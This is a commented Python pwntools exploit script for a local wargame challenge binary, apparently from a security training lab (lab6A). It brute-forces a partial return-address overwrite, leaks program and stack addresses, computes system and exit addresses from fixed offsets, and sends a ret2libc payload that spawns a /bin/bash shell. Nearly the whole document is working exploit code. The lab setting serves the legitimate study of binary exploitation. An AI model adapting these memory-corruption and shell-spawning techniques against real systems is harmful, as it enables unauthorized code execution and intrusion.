from pwn import * 

p = process('/levels/lab06/lab6A')

#pause() 
# Trying to leak values from the stack...
# This works by jumping to the print_name function (1 out of 16 times)
def first_write(value):
     
    p.sendline('1')
    # Full the username up with A's...
    user = "A" * 32
    # The read function cuts off on a null byte. But, because 32 A's are used, the nullbyte is not needed
    p.send(user) 
    
    # 128 is the size of the description 
    # len(user) is the amount of characters in the username 
    # 6 is the amount of bytes being concatentated 
    # strcat will override the last byte of the first value being concatenated. Because of this, a 1 needs to be added.
    offset = 128 - len(user) - 6 - 4

    # Fill the password to the brink...
    # Because this is filled, to the brink, we should not have a null terminated string, which allows for a leak...
    p.send('\xff' * offset + "AAAA" + value + "\x00") 
    
    return 

# Runs through multipile writes, that only work once every 16 tries.
# I have guessed that the value will be 8, when it could be 0-F
def run(): 
    first_write("\xe2\x8b")
    p.sendline('3') 
    try:
        output = p.recvuntil("AAAAA")  
        return True, output
    except EOFError:
        print 'Payload failed...'
        return False,''
   
# In order to leak the address properly, we need both the stack pointer and program pointer. This second write makes it possible to get the stack pointer
def second_write(address):
    
    packer_module = make_unpacker(32, endian='little', sign='unsigned')
    leaked_address = packer_module(address)
    leaked_address = leaked_address - 0x233
    p.sendline('1') 
    p.sendline('BB') 
    p.send('Aa' + p32(leaked_address) + "CCCC" + "\x00") 
    
# This gets the first needed value from the stack
def first_leak_parse(): 
    output = p.recvuntil("Enter Choice")        
    switch = False
    string = '' # Little endian string leak
    counter = 0
    for char in output: 
        if(char == "\xe2"):
            switch = True 
        if(switch == True):
            counter += 1
            string += char
                
        if(len(string) == 4):
            break 
    print "First Leaked address..."
    for char in string: 
        print hex(ord(char)),
    print
    return string

# After getting the first leak from the stack, we are able to setup the stack (future for the exit value) in order to jump. However, we need a stack pointer memory leak. So, this parser the value from option 3 (print listing) to get that.
def second_leak_parse():
    output = p.recvuntil("Enter Choice")      
    p.sendline('3') 
    output = p.recvuntil("Enter Choice") 
    for index in range(len(output)): 

        # Looking for the string \xbf in order to find the stack leak!
        if(output[index] == "\xbf"):
            leaked_address = output[index-3:index +1]

    print "Stack pointer leaked address: "
    for char in leaked_address: 
        print hex(ord(char)),
    return leaked_address

# Using the make_note function (currently in the exit ret address), this will execute the shellcode
def final_write(address, code_address): 
    packer_module = make_unpacker(32, endian='little', sign='unsigned')
    leaked_address = packer_module(address)

    # The location of the shell string on the stack, to be called by system
    shell_string = leaked_address - 0xD0

    # Jump to the location of the system cmd
    system = packer_module(code_address) - 0x19DA52
    exit = packer_module(code_address) - 0x1AAA02
    # /bin/sh, filler, system address, pointer to /bin/sh
    shellcode = "BBBBCCCCDDDDEEEE/bin/bash #" + "A" * 25 + p32(system) + p32(exit) + p32(shell_string) + "AAA"
    #shellcode = "" + 'A' * 47 + p32(system) + p32(exit) + p32(shell_string) 
 
    # Hit the make_note function
    p.sendline('4') 
    p.sendline(shellcode) 

# Write to the print listing function. This should throw off values from the stack...
output = False
for i in range(16):
    output, string= run()

    # If the interation worked properly...
    if(output == True):
        # The rest of the strings output
        first_leak = first_leak_parse() 
        second_write(first_leak)
        second_leak = second_leak_parse() 
        pause() 
        final_write(second_leak, first_leak)  
        p.interactive() 
        print p.recv() 
        print p.recv()
        print p.recv()
        print p.recv()
        print p.recv()
        print p.recv()

        #final_location = "CCCC"
        #p.sendline('A' * 52 + final_location)
        #p.interactive() 
    p = process('/levels/lab06/lab6A') 
